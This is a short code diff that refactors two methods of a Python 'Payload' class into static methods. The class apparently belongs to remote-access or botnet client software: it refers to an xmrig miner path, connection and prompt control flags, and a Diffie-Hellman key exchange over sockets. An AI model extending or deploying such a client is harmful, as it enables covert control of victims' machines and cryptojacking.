@@ -111,7 +111,8 @@ class Payload():
         self.xmrig_path_dev = None
 
 
-    def _get_flags(self):
+    @staticmethod
+    def _get_flags():
         return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())
 
 
@@ -138,7 +139,8 @@ class Payload():
         return connection
 
 
-    def _get_key(self, connection):
+    @staticmethod
+    def _get_key(connection):
         if isinstance(connection, socket.socket):
             if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
                 return globals()['diffiehellman'](connection)
